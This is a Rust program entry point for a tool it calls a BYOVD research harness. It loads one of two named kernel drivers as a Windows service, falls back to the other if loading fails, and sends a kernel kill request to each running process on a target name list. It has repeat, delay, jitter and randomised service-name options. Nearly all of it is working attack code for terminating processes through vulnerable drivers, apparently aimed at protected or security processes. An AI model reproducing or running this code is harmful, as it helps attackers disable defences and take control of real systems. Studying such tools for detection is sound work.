mod config;
mod drv;
mod loader;
mod obf;
mod reporting;
mod targets;
mod validation;

use std::io::Write;
use std::{process, thread, time::Duration};

use drv::Kind;
use reporting::{Event, Output};

const EXIT_OK: i32 = 0;
const EXIT_NO_TARGET: i32 = 2;
const EXIT_DRIVER_FAIL: i32 = 3;

fn flush_and_exit(code: i32) -> ! {
    let _ = std::io::stdout().flush();
    process::exit(code);
}

struct Opts {
    repeat: bool,
    dry_run: bool,
    json: bool,
    list_mode: bool,
    version: bool,
    delay_ms: u64,
    jitter_ms: u64,
    max_attempts: u32,
    no_fallback: bool,
    service_name: Option<String>,
    driver_path: Option<String>,
    cli_names: Option<String>,
    cli_config: Option<String>,
    driver_kind: Option<String>,
}

fn parse_args() -> Option<Opts> {
    let args: Vec<String> = std::env::args().collect();
    let mut o = Opts {
        repeat: false,
        dry_run: false,
        json: false,
        list_mode: false,
        version: false,
        delay_ms: 0,
        jitter_ms: 0,
        max_attempts: 0,
        no_fallback: false,
        service_name: None,
        driver_path: None,
        cli_names: None,
        cli_config: None,
        driver_kind: None,
    };
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-r" | "--repeat" => o.repeat = true,
            "-d" | "--dry-run" => o.dry_run = true,
            "-j" | "--json" => o.json = true,
            "-l" | "--list" => o.list_mode = true,
            "-v" | "--version" => o.version = true,
            "--delay" => {
                i += 1;
                if i < args.len() {
                    o.delay_ms = args[i].parse().unwrap_or(0);
                }
            }
            "--jitter" => {
                i += 1;
                if i < args.len() {
                    o.jitter_ms = args[i].parse().unwrap_or(0);
                }
            }
            "--max-attempts" => {
                i += 1;
                if i < args.len() {
                    o.max_attempts = args[i].parse().unwrap_or(0);
                }
            }
            "--svc" | "--service-name" => {
                i += 1;
                if i < args.len() {
                    o.service_name = Some(args[i].clone());
                }
            }
            "--driver" => {
                i += 1;
                if i < args.len() {
                    o.driver_path = Some(args[i].clone());
                }
            }
            "-k" | "--kind" => {
                i += 1;
                if i < args.len() {
                    o.driver_kind = Some(args[i].clone());
                }
            }
            "-n" | "--names" => {
                i += 1;
                if i < args.len() {
                    o.cli_names = Some(args[i].clone());
                }
            }
            "-c" | "--config" => {
                i += 1;
                if i < args.len() {
                    o.cli_config = Some(args[i].clone());
                }
            }
            "-h" | "--help" => {
                print_help();
                return None;
            }
            _ => {}
        }
        i += 1;
    }
    Some(o)
}

fn print_help() {
    println!("0xCr0ssCrush - Windows BYOVD research harness (DCRCVDrv.sys + Alinubx.sys)");
    println!();
    println!("usage: crosscrush.exe [options]");
    println!();
    println!("options:");
    println!("  -k, --kind <dcrc|alinubx>  first driver to attempt (default: dcrc, twin fallback)");
    println!("  -n, --names <csv>          target process name list");
    println!("  -c, --config <path>        load target list from file");
    println!("  -d, --dry-run              resolve targets and drivers, send no IOCTLs");
    println!("  -j, --json                 machine-readable output (see docs/architecture.md)");
    println!("  -l, --list                 print the effective target list and exit");
    println!("  -r, --repeat               keep scanning until interrupted or --max-attempts");
    println!("      --max-attempts <n>     stop after n scan passes (with --repeat)");
    println!("      --delay <ms>           sleep before starting");
    println!("      --jitter <ms>          add a timing variation to the scan interval");
    println!("      --svc <name>           service name for the driver registration");
    println!("      --driver <path>        driver file to load (validated by hash first)");
    println!("      --no-fallback          single-driver run, no twin switch");
    println!("  -v, --version              print version and exit");
    println!("  -h, --help                 show this help");
    println!();
    println!("exit codes: 0 ok, 2 no targets, 3 driver validation/load failure");
}

fn main() {
    let opts = match parse_args() {
        Some(o) => o,
        None => return,
    };

    if opts.version {
        println!("0xCr0ssCrush v0.1.0 (research build)");
        println!("DCRCVDrv.sys (0x2205C0) + Alinubx.sys (0x222024) kernel-process primitives");
        return;
    }

    if opts.delay_ms > 0 {
        thread::sleep(Duration::from_millis(opts.delay_ms));
    }

    let out = Output::new(opts.json);

    // Preferred driver order. -k picks the first driver we attempt; the
    // twin always stays in the queue. If DCRCVDrv.sys cannot be loaded
    // the harness moves to Alinubx.sys, mirroring the operators' own
    // redundancy approach.
    let preferred: Option<Kind>;
    if let Some(k) = &opts.driver_kind {
        preferred = match Kind::parse(k) {
            Some(k2) => Some(k2),
            None => {
                println!("error: unknown driver kind '{k}' (use dcrc or alinubx)");
                flush_and_exit(EXIT_DRIVER_FAIL);
            }
        };
    } else {
        preferred = None;
    }

    let names: Vec<String> = if let Some(n) = &opts.cli_names {
        config::parse_names_csv(n)
    } else if let Some(path) = &opts.cli_config {
        config::load_names_file(path).unwrap_or_default()
    } else {
        config::load_default_or(&targets::defaults())
    };

    if opts.list_mode {
        println!("targets: {}", names.len());
        for n in &names {
            println!("  {n}");
        }
        return;
    }

    if names.is_empty() {
        println!("error: no target names specified");
        flush_and_exit(EXIT_NO_TARGET);
    }

    let mut order: Vec<Kind> = Kind::order();
    if opts.no_fallback {
        order = vec![preferred.unwrap_or(Kind::Dcrc)];
    } else if let Some(p) = preferred {
        let mut tmp: Vec<Kind> = Vec::new();
        for k in order {
            if k != p {
                tmp.push(k);
            }
        }
        tmp.insert(0, p);
        order = tmp;
    }

    // Attempt each driver in order. The driver file is hash-validated
    // before anything is registered with the SCM.
    let mut _drv_svc: Option<loader::DriverService> = None;
    let mut dev: Option<drv::CrossDev> = None;
    let mut kind: Kind = order[0];

    for k in order {
        out.emit(
            Event::Info(format!("attempting driver {}", k.display_name())),
            None,
        );
        if let Ok(d) = drv::CrossDev::open(k) {
            out.emit(
                Event::Info(format!(
                    "{} already loaded, device reachable",
                    k.display_name()
                )),
                None,
            );
            dev = Some(d);
            kind = k;
            break;
        }

        let drv_file = ops_resolve_driver(&opts, k);
        match validation::validate_driver(&drv_file) {
            Ok(digest) => {
                out.emit(
                    Event::Driver(
                        k.display_name().to_string(),
                        k.device_path(),
                        format!("0x{:X}", k.ioctl()),
                        digest[..16].to_string(),
                    ),
                    None,
                );
            }
            Err(e) => {
                out.emit(Event::Rejected(format!("{drv_file}: {e}")), None);
                flush_and_exit(EXIT_DRIVER_FAIL);
            }
        }

        let svc_name = opts
            .service_name
            .clone()
            .unwrap_or_else(|| format!("{}{:06X}", k.svc_prefix(), unique_suffix()));
        if let Ok((svc, created)) = loader::DriverService::install(&svc_name, &drv_file) {
            if svc.start().is_ok() {
                if let Ok(d) = drv::CrossDev::open(k) {
                    out.emit(
                        Event::Info(format!("{} loaded, device opened", k.display_name())),
                        None,
                    );
                    if created {
                        _drv_svc = Some(svc);
                    }
                    dev = Some(d);
                    kind = k;
                    break;
                }
            }
        }
        out.emit(
            Event::Info(format!("{} refused, moving to twin", k.display_name())),
            None,
        );
    }

    if dev.is_none() {
        println!("fatal: neither DCRCVDrv.sys nor Alinubx.sys could be loaded");
        flush_and_exit(EXIT_DRIVER_FAIL);
    }
    let dev = dev.unwrap();

    if opts.dry_run {
        let procs = targets::find_running(&names.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
        for (name, pid) in &procs {
            out.emit(Event::KillResolved(name.clone(), *pid), None);
        }
        out.emit(
            Event::Summary {
                submitted: 0,
                resolved: procs.len(),
            },
            None,
        );
        drop(dev);
        flush_and_exit(if procs.is_empty() {
            EXIT_NO_TARGET
        } else {
            EXIT_OK
        });
    }

    let mut attempt: u32 = 0;
    let mut submitted = 0usize;
    let mut resolved = 0usize;

    loop {
        attempt += 1;
        let procs = targets::find_running(&names.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
        for (name, pid) in &procs {
            out.emit(Event::KillResolved(name.clone(), *pid), None);
            resolved += 1;
            match dev.kill_pid(kind, *pid) {
                Ok(_) => {
                    submitted += 1;
                    out.emit(
                        Event::KillSubmitted {
                            pid: *pid,
                            ok: true,
                        },
                        None,
                    );
                }
                Err(e) => {
                    out.emit(
                        Event::KillResult {
                            pid: *pid,
                            result: "error",
                            detail: e,
                        },
                        Some(*pid),
                    );
                }
            }
        }

        if !opts.repeat || (opts.max_attempts > 0 && attempt >= opts.max_attempts) {
            break;
        }
        thread::sleep(Duration::from_millis(3000 + opts.jitter_ms));
    }

    out.emit(
        Event::Summary {
            submitted,
            resolved,
        },
        None,
    );
    drop(dev);
    flush_and_exit(if submitted > 0 {
        EXIT_OK
    } else {
        EXIT_NO_TARGET
    });
}

fn ops_resolve_driver(opts: &Opts, k: Kind) -> String {
    // Resolve the driver path exactly as stored metadata expects:
    // absolute paths pass through, otherwise the file is looked up
    // next to the executable and in the current directory.
    let fname = opts.driver_path.clone().unwrap_or_else(|| k.driver_file());
    if std::path::Path::new(&fname).is_absolute() {
        return fname;
    }
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let cand = dir.join(&fname);
            if cand.exists() {
                return cand.to_string_lossy().to_string();
            }
        }
    }
    if let Ok(cwd) = std::env::current_dir() {
        let cand = cwd.join(&fname);
        if cand.exists() {
            return cand.to_string_lossy().to_string();
        }
    }
    fname
}

/// Derive a unique service-name suffix from runtime state so that
/// repeated runs of the harness do not collide with stale registrations.
fn unique_suffix() -> u64 {
    use windows::Win32::System::SystemInformation::GetTickCount64;
    use windows::Win32::System::Threading::GetCurrentProcessId;
    let tick = unsafe { GetTickCount64() };
    let pid = unsafe { GetCurrentProcessId() };
    (tick ^ pid as u64) & 0xFFFFFF
}
